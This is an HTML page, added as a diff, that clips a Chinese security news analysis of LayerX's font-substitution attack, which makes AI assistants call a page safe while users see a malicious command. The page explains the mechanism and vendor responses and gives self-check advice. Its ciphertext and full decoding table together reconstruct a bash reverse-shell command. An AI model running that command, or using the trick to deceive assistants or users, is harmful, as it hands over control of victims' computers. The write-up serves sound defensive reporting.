@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>几乎所有AI全部中招 网络安全公司LayerX发现了一种新型的“视觉欺诈”攻击方式 · 剪藏知识库</title>
+<link rel="stylesheet" href="../assets/style.css">
+<script>
+  (function(){ try { var t = localStorage.getItem('theme'); if (t) document.documentElement.setAttribute('data-theme', t); } catch(e){} })();
+</script>
+</head>
+<body>
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="../index.html">剪藏知识库</a>
+    <button class="theme-toggle" id="themeToggle" aria-label="切换主题">🌓</button>
+  </div>
+</header>
+<main class="wrap article">
+  <a class="back" href="../index.html">← 返回总览</a>
+  <h1 class="article-title">几乎所有AI全部中招 网络安全公司LayerX发现了一种新型的“视觉欺诈”攻击方式</h1>
+  <div class="meta">
+    <a class="chip author" href="../index.html?author=%E5%B0%8F%E4%BA%92">小互</a>
+    <a class="chip" href="../index.html?tag=AI">AI</a><a class="chip" href="../index.html?tag=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">网络安全</a><a class="chip" href="../index.html?tag=%E8%A7%86%E8%A7%89%E6%AC%BA%E8%AF%88">视觉欺诈</a><a class="chip" href="../index.html?tag=%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AD%97%E4%BD%93">自定义字体</a><a class="chip" href="../index.html?tag=LayerX">LayerX</a>
+    <span class="date">2026-07-31</span>
+  </div>
+  <p class="lead">这种攻击利用了“人类眼睛看到的”与“AI 助手读取到的”不一致的视角差，欺骗 AI 给恶意命令“背书”。</p>
+  <article class="content"><p>小互 小互AI <em>2026年7月30日 16:09</em></p>
+<p>FONT / GLYPH / DOM</p>
+<p>一个自定义字体加几行 CSS 就够，不用 JavaScript，也不用任何浏览器漏洞。</p>
+<p><strong>c</strong> <em>→</em> <em>a</em> <strong>v</strong> <em>→</em> <em>W</em> <strong>A</strong> <em>→</em> <em>空格</em></p>
+<p>一分钟速览</p>
+<p>网络安全公司 LayerX 发现了一种新型的“视觉欺诈”攻击方式</p>
+<p>可以隐蔽的攻击 AI 助手，几乎所有的AI工具全部中招</p>
+<p>这种攻击利用了“人类眼睛看到的”与“AI 助手读取到的”不一致的视角差，欺骗 AI 给恶意命令“背书”。</p>
+<p>当你让 AI 助手帮你看一个网页并判断“上面的命令安全不安全”时，AI 和人类看网页的方式截然不同：</p>
+<p>AI 助手怎么看：</p>
+<p>AI 不用“眼睛”看画面，而是直接解析网页底层的 HTML 代码结构（DOM 树）。</p>
+<p>人类怎么看：</p>
+<p>浏览器将 HTML 和 CSS 渲染成视觉图像呈现给你。</p>
+<p>黑客正是利用了这种差异，通过以下两步组合拳完成欺骗：</p>
+<p>自定义字体映射（Glyph Substitution）：</p>
+<p>黑客在网页中加载特殊的自定义字体，将乱码或无意义的字符重新映射为恶意的命令行（比如反向 Shell 攻击指令）。</p>
+<p>CSS 隐形战术：</p>
+<p>在 HTML 代码中插入一段看似极其无害的文本（例如普通的提示语），同时用 CSS 把这段无害文本的字号缩小到近乎不可见、或者调整颜色使其与背景融为一体。</p>
+<p>最终效果：</p>
+<p>AI 看到的是：</p>
+<p>底层无害的 HTML 文本，因此评估后告诉用户：“这段代码非常安全，可以放心运行。”</p>
+<p>用户看到的是：</p>
+<p>经过字体替换渲染后的恶意指令（例如一条伪装成游戏彩蛋、实则会入侵电脑的命令）。</p>
+<p>根据 LayerX 的测试，在 2025 年底，这种攻击方式对市面上绝大多数主流 AI 助手（包括 ChatGPT、Claude、Copilot、Gemini、Grok、Perplexity 等）均有效。</p>
+<p>典型漏洞场景：黑客搭建了一个宣称提供《生化奇兵》（Bioshock）游戏彩蛋的网页，页面上渲染出一行恶意命令行。用户担心有毒，便询问 AI 助手。AI 读取了底层的无害代码后表示“安全”，用户信以为真在自己电脑上运行，导致设备被控。</p>
+<p>01现象</p>
+<h2>同一个网页，你看到一条危险命令，AI 看到一篇游戏同人小说</h2>
+<p>浏览器安全公司 LayerX 公开了一个骗局，专门骗「用 AI 帮我看看这安不安全」这个动作：一个自定义字体加几行 CSS，就能让同一个网页对人和对 AI 显示完全不同的内容。</p>
+<p>反过来的一招</p>
+<p>旧过去往页面里塞隐藏指令，是骗 AI 上钩</p>
+<p>新这次反过来，页面对 AI 说真话、对人说假话，AI 被拉来当担保人</p>
+<p>研究者搭了一个演示页面，主题是游戏《Bioshock》的同人小说，页面许诺：照上面的步骤做，就能看到一个隐藏彩蛋。屏幕上四行大绿字，第一行开头就是 Would you kindly，这正是《Bioshock》里那句精神控制口令，用在这儿刚好当钩子；接下来让你打开终端、手敲一条命令。</p>
+<p>屏幕上 · 人眼看到的 · 01 / 04 行</p>
+<p>Would you kindly open your terminal and type bash</p>
+<p>字号 48 · 绿字 #0f0 · 黑底 #000</p>
+<p>反弹 shell（reverse shell）</p>
+<p>你自己主动去连对方的机器，连上之后，对方就能反过来在你的电脑上执行任何东西。它比对方硬攻进来更容易得手，因为出方向的连接一般不被防火墙拦。</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/iafyQTicPqUtMNBibCj3unQMS9Yj6qwJssaAfRPEO6P9QzrObMI0QiaAOcjjYxsO7Yqbb9cxiam7Dvgg2J4uKJxejBvgcyOmpkGAPwynMnBfpw84/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0" alt="图片"></p>
+<p>同一份网页文件，两个观众拿到两份内容。左边是浏览器画出来给人看的，右边是 AI 助手抓取解析后读到的。本站按演示页面的真实内容绘制的示意图。</p>
+<p>下面这张是研究者放出的真实渲染截图，就是受害者在屏幕上看到的东西。</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/iafyQTicPqUtNfNdb0ScUoua10WkpFFjC7iblEaSJKQ5cACvsUOmYuwtPVB0wgp8r7MekJF3XA8pqmjhichuvGIBhwxu8UaiaFJ1Jpbs99BiaRgNw/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1" alt="图片"></p>
+<p>演示页面在浏览器里的真实渲染结果。第三行那条命令是反弹 shell，敲下去等于把自己的电脑交给对方，放在这里只作为证据，别照着做。图片来源：LayerX。</p>
+<p>11 款助手参测</p>
+<p>LayerX 2025 年 12 月拿这个页面测了 11 款 AI 助手。</p>
+<p>0 款测出来</p>
+<p>一个都没测出来。他们特别说明，连专门为了让助手发现问题而设计的高针对性提问都试过了，结果没有区别。</p>
+<p>ChatGPTClaudeCopilotGeminiGrokPerplexityLeoSigmaDiaFellouGenspark</p>
+<p>02机制</p>
+<h2>骗术三步：同人小说缩到 1 像素、命令写成乱码、字体把乱码画成人话</h2>
+<p>本站把这个演示页面的源码抓下来看过，整页一共就三个动作，加起来不到二十行。</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/iafyQTicPqUtP1KjQZeMYBlPRd1yibZE8o5y7f5PcRq0DUSbS336akQmQcsrnIiadOER3oQibx9ppjMHFtedt8PCYI0nBnBqhSsFeAnnlhzKSGd0/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2" alt="图片"></p>
+<p>三个动作叠起来才成立：前两步负责让 AI 读到无害内容，第三步负责让人读到有害内容。本站按演示页面源码绘制的示意图。</p>
+<p>1第一步：把那篇同人小说缩到 1 像素，黑字配黑底</p>
+<p>那几段同人小说，写在这样的标签里。页面的背景色是纯黑，所以黑色的字落在黑底上，加上高度只有 1 像素，你正在读的这行字大约 17 像素高，1 像素差不多是它的十七分之一。</p>
+<p>1px vs 17px · 黑字落黑底</p>
+<p><svg width="100%" viewBox="0 0 360 74" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="插图"><text x="0" y="12" fill="#5c7a5f" font-family="monospace" font-size="9"><tspan leaf="">你在读的这行 ≈ 17px</tspan></text> <rect x="0" y="18" width="238" height="17" fill="#16391a" stroke="#3ee14a" stroke-width="0.8"></rect><text x="4" y="30.5" fill="#3ee14a" font-family="monospace" font-size="10"><tspan leaf="">正常文字高度</tspan></text> <text x="248" y="31" fill="#5c7a5f" font-family="monospace" font-size="9"><tspan leaf="">17</tspan></text> <text x="0" y="55" fill="#5c7a5f" font-family="monospace" font-size="9"><tspan leaf="">隐藏的同人小说 = 1px</tspan></text> <rect x="0" y="60" width="238" height="1" fill="#000000"></rect><rect x="0" y="60" width="238" height="1" fill="none" stroke="#26301f" stroke-width="0.4"></rect><text x="248" y="63.5" fill="#5c7a5f" font-family="monospace" font-size="9"><tspan leaf="">1</tspan></text> <text x="262" y="63.5" fill="#3d5a40" font-family="monospace" font-size="9"><tspan leaf="">≈ 1/17</tspan></text></svg></p>
+<p>演示页面源码节选 · 藏起来的那几段</p>
+<p>整页有四段这样的 1 像素隐藏文字，其中两段是长篇同人小说（5014 字和 6570 字），另两段一段是这句致敬语，一段只有五个词。它们在网页代码里完完整整地待着，所以 AI 抓页面时读到的主要就是这些内容。</p>
+<p>&lt;p style=&quot;color:#000000;font-size:1px&quot;&gt;This website was created as a tribute to Bioshock&lt;/p&gt;</p>
+<p>2第二步：把给人看的那句命令，在代码里写成一串乱码</p>
+<p>页面正中间是一个再普通不过的 &lt;div&gt;，里面四行字符，长得像 base64 编码之后的一坨东西。AI 助手看到这种东西，能给出的判断就是「高熵字符串，没有密钥解不开」，于是当作噪音跳过。</p>
+<p>演示页面源码 · 给人看的那段（在代码里的样子）</p>
+<p>这四行就是屏幕上那四行大绿字。第一行的 49 个字符，渲染出来正好是「Would you kindly open your terminal and type bash」这 49 个字符。</p>
+<p>&lt;div&gt; vRmUwAgRmAiPjwUgARrhjAgRmbAshbVPjcUAcjwAsgrhAfcao<br>&lt;br&gt;RjJhAgRmAhnhJmshwAPsAsgrh<br>&lt;br&gt;fcaoADPAHBAFwhuFsJrF859E806E8E35F6266A2HB8<br>&lt;br&gt;PsAOPUUAcUUROAgRmAsRAahhAgRmbAhcashbAhWWAxbRVAMcrsmbh &lt;/div&gt;</p>
+<p>本站 · 报告和报道都没提的一件事</p>
+<p>本站在源码里还看到一件研究报告和报道都没提的事：紧挨着这个乱码框的上一行，藏着一段同样是 1 像素的隐藏文字，内容只有五个词，LLM Generation Seed:（大模型生成种子）。也就是说，AI 读到的顺序是「生成种子：」后面跟一串随机字符。它不需要自己猜这堆东西是什么，攻击者已经替它贴好了标签。研究者放出的源码截图里没有这一段，说明页面在截图之后被改过。</p>
+<p>3第三步：挂一套字母画法被换掉的字体</p>
+<p>页面头部引了一个字体文件，然后把它套给整个页面。字号 48、绿字、黑底，就是屏幕上那副样子。</p>
+<p>演示页面源码 · 字体与配色</p>
+<p>这套字体里，每个字母的画法被换掉了：文件里名叫 c 的那个字形（glyph，字体文件里一个字母的具体画法），画出来是一个 a；名叫 v 的，画出来是一个 W。所以浏览器照着它一画，那串乱码就成了人话。</p>
+<p>@font-face {<br>font-family: &#39;fontie&#39;;<br>src: url(&#39;RaptureFont.ttf&#39;) format(&#39;truetype&#39;);<br>}<br>body {<br>font-family: &#39;fontie&#39;, sans-serif;<br>font-size: 48px;<br>background: #000;<br>color: #0f0;<br>}</p>
+<p>三个动作单独看都完全合法：CSS 本来就允许你把字缩小、把颜色调成和背景一样；&lt;div&gt; 里可以写任何字符串；网页当然可以带自己的字体。没有一处用到 JavaScript，也没有用到任何浏览器漏洞，把 JS 全部关掉，这个页面照样骗得成。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/iafyQTicPqUtMF9fbFXiakUBcIFRWtREK0MsjuKXIJc7QMjP6XaKKgLiaPasYo8Q7uRZvcHtibgTQDFPiayEqDBB9TDyJnZebkPL3F4c7hE2yGKqY/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3" alt="图片"></p>
+<p>研究者给源码做的标注。绿框是被缩到 1 像素、黑字黑底的同人小说，人看不见、AI 读得到；红框是那串乱码，人看得见（经字体渲染成人话）、AI 只当噪音。图片来源：LayerX。</p>
+<p>03盲区</p>
+<h2>AI 为什么一点没察觉？因为它只读网页代码，浏览器才加载字体重画</h2>
+<p>AI 助手抓网页，抓的是网页代码（术语叫 DOM，也就是浏览器把代码读进来之后在内存里搭出的那份文字骨架）：标签、结构、里面的文字。它不跑完整的浏览器渲染管线，不下载字体文件，也不去算「这个字母最后画出来是什么形状」。</p>
+<p>LayerX 把这类助手叫做非代理式（non-agentic）的：取页面、解析代码，但不执行完整渲染、不分析自定义字体的字形映射。</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/iafyQTicPqUtN72LCWtPw1mKwBKYwsMCMp2t81KNe7by5gkrabQsY5a6P0EibTMMnDbQp50SDu5MFWbH2X6hPa6ctaYlXA8neu6GMMHbb75icT8/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4" alt="图片"></p>
+<p>两条路读同一份文件，末端给出相反的结论。本站按 LayerX 的攻击流程图重画的中文版示意图。</p>
+<p>这里有一个所有人都默认成立的假设：网页代码是内容，字体只管好看，字体不改变文字的意思。这个假设几乎总是成立，所以没人去查它，而正因为它平时是安全的，这一招才这么好用。</p>
+<p>打个比方</p>
+<p>好比一份合同，白纸黑字写的是一件事，但打印机的字模被换过：每个铅字的模子里装的都是别的字。校对员核对的是稿件文档，签字的人看的是打印出来的那张纸。两个人都尽了责，却在不同的两份合同上达成了一致。</p>
+<p>还有一层后果：助手不只是没看出问题，它还告诉你「这个页面看起来是安全的」。</p>
+<p>“</p>
+<p>当攻击者做出一个恶意页面、并且让 AI 助手把它判定为安全，他实际上是征用了这个助手的权威，拿它的信誉来给自己的说法背书。</p>
+<p>LayerX 研究报告（本站译）</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/iafyQTicPqUtNtJ3zJALrx71LPDZxJYZY5qlGwVvvQADKlGy2WPDs6PpyC5ZxkiaibR4zvQtV8xBSLUgfQJuzA4HxeuGFE7KsHYIOhAohk6dfGA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5" alt="图片"></p>
+<p>研究者原版的攻击流程图。左路是助手：读原始 HTML、看到乱码、看到同人小说、不管字形映射，结论「页面看起来安全」；右路是浏览器渲染引擎：套 CSS、加载自定义字体、重映射字形、藏掉同人小说、显示出解开的内容，用户看到的是反弹 shell 命令。图片来源：LayerX。</p>
+<p>要注意这个结论的适用范围：它针对的是「只读代码不渲染」的那类助手。如果一个助手真的把页面渲染出来、用截图去看，理论上它看到的就是那四行绿字，不过 LayerX 没测过这类助手，它的测试对象全部是前一类。</p>
+<p>同一类思路的另一个案例</p>
+<p>你让 AI 写代码，它推荐的软件其实不存在：黑客用同一个名字放好了病毒</p>
+<p>同样是拿人对模型输出的信任下手：AI 编出一个并不存在的软件包名字，攻击者就照那个名字把病毒放好，等你照着装。</p>
+<p>04本站核对</p>
+<h2>本站拆开这套骗人的字体核对：被动手的是字母的形状，对照表干干净净</h2>
+<p>下面这一段不来自 LayerX 的报告，也不来自任何一篇报道，是本站自己做的核对：把演示页面用的字体文件下载下来，读它的内部各张表，再拿它把那串乱码重新渲染一遍。</p>
+<p>字体文件里有一张表叫 cmap，管的是「字符 a 该去用哪个字形」。要检查一套字体有没有被动手，最容易想到的就是查这张表。这套字体的 cmap 完全正常：字符 a 指向名叫 a 的字形，字符 0 指向名叫 zero 的字形，5918 个字符映射一处异常都没有；管字形替换和字距定位的 GSUB、GPOS 两张表根本不存在。</p>
+<p>动过手的是 glyf 表里的轮廓数据，也就是每个字形具体怎么画。名叫 a 的那个字形，肚子里装的是一个 s 的画法。几个能直接量出来的数：</p>
+<p>0 处</p>
+<p>cmap 字符对照表里的异常，5918 个映射全部正常</p>
+<p>0 条</p>
+<p>名叫 A 的字形一笔都不画，屏幕上就是一段空白，顶替了句子里的空格</p>
+<p>2025</p>
+<p>名叫 v 的字形宽度，26 个小写字形里最宽的一个，因为它画的是个 W</p>
+<p>169 字</p>
+<p>四行乱码全部逐字对上，一对一替换，零冲突</p>
+<p>拿第一行开头的 16 个字符对一遍，替换关系一眼就出来了：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/iafyQTicPqUtPriakCicLQn6NTG8ahhxRYoC0fkrb5j8LfLsflnI8Bn4lWSoCagiaQjQR6XiaSjWibyEspibQ37EVZ7BLmv6E8mA3BEX8lgkxPYiaQt4/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6" alt="图片"></p>
+<p>网页代码里的 vRmUwAgRmAiPjwUg 和屏幕上的 Would you kindly 逐格对齐。红色标出的两个 A 在这套字体里没有任何轮廓，画出来是空白。本站用 fontTools 读表 + Pillow 重新渲染后绘制。</p>
+<p>整套替换是严格一对一的。第一行 49 个字符，还原出来的句子也是 49 个字符，一个不多一个不少；四行 169 个字符全部对上，没有一处冲突。每个字符的对应关系是这样：</p>
+<p>左 = 网页代码里的字符　右 = 屏幕上画出来的</p>
+<p><strong>a</strong> <em>→</em> <em>s</em> <strong>b</strong> <em>→</em> <em>r</em> <strong>c</strong> <em>→</em> <em>a</em> <strong>d</strong> <em>→</em> <em>E</em> <strong>e</strong> <em>→</em> <em>L</em> <strong>f</strong> <em>→</em> <em>b</em> <strong>g</strong> <em>→</em> <em>y</em> <strong>h</strong> <em>→</em> <em>e</em> <strong>i</strong> <em>→</em> <em>k</em> <strong>j</strong> <em>→</em> <em>n</em> <strong>k</strong> <em>→</em> <em>X</em> <strong>l</strong> <em>→</em> <em>U</em> <strong>m</strong> <em>→</em> <em>u</em> <strong>n</strong> <em>→</em> <em>x</em> <strong>o</strong> <em>→</em> <em>h</em> <strong>p</strong> <em>→</em> <em>V</em> <strong>q</strong> <em>→</em> <em>M</em> <strong>r</strong> <em>→</em> <em>p</em> <strong>s</strong> <em>→</em> <em>t</em> <strong>t</strong> <em>→</em> <em>F</em> <strong>u</strong> <em>→</em> <em>v</em> <strong>v</strong> <em>→</em> <em>W</em> <strong>w</strong> <em>→</em> <em>d</em> <strong>x</strong> <em>→</em> <em>f</em> <strong>y</strong> <em>→</em> <em>D</em> <strong>z</strong> <em>→</em> <em>j</em> <strong>A</strong> <em>→</em> <em>空格</em> <strong>B</strong> <em>→</em> <em>&amp;</em> <strong>D</strong> <em>→</em> <em>-</em> <strong>E</strong> *→**.*<strong>F</strong> <em>→</em> <em>/</em> <strong>H</strong> <em>→</em> <em>&gt;</em> <strong>J</strong> <em>→</em> <em>c</em> <strong>M</strong> <em>→</em> <em>R</em> <strong>O</strong> <em>→</em> <em>w</em> <strong>P</strong> <em>→</em> <em>i</em> <strong>R</strong> <em>→</em> <em>o</em> <strong>U</strong> <em>→</em> <em>l</em> <strong>V</strong> <em>→</em> <em>m</em> <strong>W</strong> <em>→</em> <em>g</em> <strong>0</strong> <em>→</em> <em>6</em> <strong>1</strong> <em>→</em> <em>5</em> <strong>2</strong> <em>→</em> <em>0</em> <strong>3</strong> <em>→</em> <em>4</em> <strong>4</strong> <em>→</em> <em>3</em> <strong>5</strong> <em>→</em> <em>9</em> <strong>6</strong> <em>→</em> <em>8</em> <strong>7</strong> <em>→</em> <em>7</em> <strong>8</strong> <em>→</em> <em>1</em> <strong>9</strong> <em>→</em> <em>2</em></p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/iafyQTicPqUtMW3TdnYZFttzocaMgu3siafnobEstn7DwO43xch4Y2zPayQ93uELicTwyyhEU0a4xeomdunm7WDl8MSowHqPdxK6iauCBA7vpFOU/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=7" alt="图片"></p>
+<p>左边是网页代码里写的字符，右边是这套字体实际画出来的东西（绿底那 14 格是大写，最容易被漏掉）。表里覆盖了那四行密文用到的全部 38 种字符，拿它逐字替换，四行能完整还原出来，可自行验证。本站用 fontTools 逐字符渲染读出。</p>
+<p>这条核对结果有个直接后果：</p>
+<p>查映射表查不出这个页面</p>
+<p>LayerX 给厂商的四条建议里有一条是「取字体文件、检查字符与字形的映射表、找异常的替换模式」。但对这个演示页面来说，查映射表查不出任何东西，那张表是干净的。要查出来，检测得再往下一层，去比每个字形的轮廓长什么样。</p>
+<p>05破口</p>
+<h2>骗术有个漏子：屏幕上那行字复制出来是乱码，所以攻击必须让你手打</h2>
+<p>你在屏幕上选中那行命令、按下复制，剪贴板里进去的是网页代码里的字符，也就是那串乱码，跟眼睛看到的完全不一样。浏览器复制的是字符本身，跟字形画成什么样无关。</p>
+<p>屏幕上选中的</p>
+<p>Would you kindly open your terminal…</p>
+<p>↓</p>
+<p>粘贴出来的</p>
+<p>vRmUwAgRmAiPjwUgARrhjAgRmbAshbVPjcUAcjwAsgrhAfcao</p>
+<p>复制粘贴会当场露馅。本站按字体的替换关系还原的对照示意图。</p>
+<p>也就是说，这个演示页面必须让受害者手打那条命令。页面上写的动词就是 type（敲），全文没有一处 copy。不过这条限制只管这个页面：攻击者只要加一段脚本改写剪贴板，复制出来的就能是解码后的命令，所以下面那条自检不是万能的。</p>
+<p>反过来，这就是一招现成的自检动作。同理，浏览器的阅读模式、或者把自定义字体关掉，都会让这套伪装当场失效，伪装靠的是页面自带那套字体，换成系统字体，那段字就退回乱码。</p>
+<p>✅ 可执行动作 · 4 条</p>
+<p>怎么不被这一招骗到</p>
+<p>01</p>
+<p>别把 AI 的「安全」当唯一判据</p>
+<p>它可能根本没看到你屏幕上那行字，这是 LayerX 和 BleepingComputer 给普通用户的明确建议</p>
+<p>02</p>
+<p>可疑文字先复制粘贴对一眼</p>
+<p>剪贴板里进去的是网页代码里的原文，跟眼睛看到的对不上就有鬼</p>
+<p>03</p>
+<p>一律不手打陌生页面给的命令</p>
+<p>这个演示页绕不过剪贴板，只能骗你手敲</p>
+<p>04</p>
+<p>开阅读模式，或者关掉自定义字体</p>
+<p>换成系统字体，那段字就退回乱码</p>
+<p>后三条是本站按已核对的机制推出来的自检动作，不是 LayerX 报告里的原文建议。第一条来自报告与报道。</p>
+<p>06厂商回应</p>
+<h2>厂商修了吗？七家里只有微软修了，Google 先判高危又降级关闭</h2>
+<p>LayerX 2025 年 12 月把发现报给了各家（先私下通报、约定期限后再公开，业内叫责任披露）。七家里六家最后都没修，但理由并不一样：四家一开口就说不在受理范围，Google 收了又反悔，Perplexity 说这是大模型的通病。其中两家的说法归结起来是「这算骗人，不算我们的系统被攻破」，安全圈把骗人这一类叫社会工程。</p>
+<p>微软已完全修复</p>
+<p>12 月 17 日受理，在自家安全响应中心（MSRC）开了案子，是七家里唯一完全修复的。案子还挂着没关，因为微软要求走满 90 天再公开。</p>
+<p>Anthropic未修</p>
+<p>按政策，「社会工程（含钓鱼）」与「模型提示和回复的内容问题」属于受理范围之外。</p>
+<p>Dia未修</p>
+<p>按项目政策不受理：导致错误信息、异常行为、拒绝服务的提示注入明确在范围之外。</p>
+<p>OpenAI未修</p>
+<p>提交材料以目前的形式，影响面不足以进入定级流程，此类问题已明确列为范围之外。</p>
+<p>Google先受理后降级</p>
+<p>一开始给了 P2（高危），后来降级关闭：认定无法造成显著的用户伤害，且过度依赖社会工程。</p>
+<p>Perplexity未修</p>
+<p>这是大语言模型处理外部网页内容时的已知局限，并非自家系统安全控制上的缺陷。</p>
+<p>xAI未修</p>
+<p>模型问题不在本项目范围内。</p>
+<p>七家的提交与关闭日期、以及各自给出的说法，取自 LayerX 报告里的披露时间表，说法为本站译文。</p>
+<p>从 2025 年 12 月测试到今天已经过了七个多月。本站查不到任何公开信息说明其他几家有没有悄悄修好；能确认的只有一件事：那个演示页面和字体文件仍然在线，用纯文本方式抓取它，看到的仍然只有同人小说和乱码。</p>
+<p>07修法</p>
+<h2>LayerX 给的修法：渲染完跟代码比一遍，字体也得当攻击面查</h2>
+<p>报告给厂商开了四条检测，再加一条关于说话分寸的要求。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/iafyQTicPqUtPUpQs8RVPVlDokYS5Gtvd5IxsnNrn7ic0XuJDBPWldOIdK7VZRAnbh7rh7wlELXLU09chFpaYGCUticydHEkDzvwdbxDFnNdrRw/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=8" alt="图片"></p>
+<p>四条检测加一条置信度要求。第三条下面那句实测结论来自本站的字体核对，其余为报告内容。</p>
+<p>第 1 条 · 四条里最实在的</p>
+<p>一路只取代码里的文字，一路带字体完整渲染，把渲染后看得见的字抽出来，两边比差异。这一招不依赖任何关于攻击手法的先验知识：字体、透明度、屏幕外定位，只要人看到的和代码里写的对不上，它就报得出来。</p>
+<p>第 5 条 · 说话分寸</p>
+<p>如果它做不到渲染页面、分析自定义字体、比对视觉与代码这三件事，那它就不该说出「这个页面是安全的」这种话。就这个案子而言，改掉最后这一句，比修前面四条都便宜。</p>
+<p>“</p>
+<p>网页不只是 HTML。意思可以被搬进渲染管线里，任何只分析文字的系统，天生就是瞎的。</p>
+<p>LayerX 报告结语（本站译）</p>
+<p>来源</p>
+<p>New font-rendering trick hides malicious commands from AI tools</p>
+<p><a href="https://www.bleepingcomputer.com/news/security/new-font-rendering-trick-hides-malicious-commands-from-ai-tools/">https://www.bleepingcomputer.com/news/security/new-font-rendering-trick-hides-malicious-commands-from-ai-tools/</a></p>
+<p>延伸</p>
+<p>LayerX 研究报告</p>
+<p><a href="https://layerxsecurity.com/blog/poisoned-typeface-a-simple-font-rendering-poisons-every-ai-assistant-and-only-microsoft-cares/">https://layerxsecurity.com/blog/poisoned-typeface-a-simple-font-rendering-poisons-every-ai-assistant-and-only-microsoft-cares/</a></p>
+<p>研究者的演示页面</p>
+<p><a href="https://layerxresearch.com/RaptureFuture">https://layerxresearch.com/RaptureFuture</a></p>
+<p>本站说明</p>
+<p>三张截图（渲染结果、源码标注、攻击流程图）均来自 LayerX 研究报告；五张 SVG 示意图、一张复制粘贴对照图与那张解码表由本站绘制。「本站核对」一节、复制粘贴会露馅这一条、以及自检清单的后三条，来自本站 2026 年 7 月 30 日的复现：下载演示页面的字体文件，用 fontTools 读内部各张表、用 Pillow 重新渲染那四行字符，均不来自报告与报道。演示页面链接仅供自行验证，页面上那条命令切勿照做。厂商披露时间表的日期与说法取自报告，中文为本站译文。研究发布于 2026 年 3 月 17 日；LayerX 已于 2026 年 7 月 2 日被 Akamai 以约 2.05 亿美元收购完成，研究发布时尚未交割。</p>
+<p>网页版另有交互视图：一页纸速读视图 / 秒懂漫画，完整体验见原文链接。</p>
+<p>阅读原文</p>
+</article>
+  <p class="orig"><a href="https://mp.weixin.qq.com/s/AT6of-9uAfilXANB8sl1Sg" target="_blank" rel="noopener">查看原文 ↗</a></p>
+</main>
+<script>
+  (function(){
+    var btn = document.getElementById('themeToggle');
+    if (btn) btn.addEventListener('click', function(){
+      var cur = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', cur);
+      try { localStorage.setItem('theme', cur); } catch(e){}
+    });
+  })();
+</script>
+</body>
+</html>
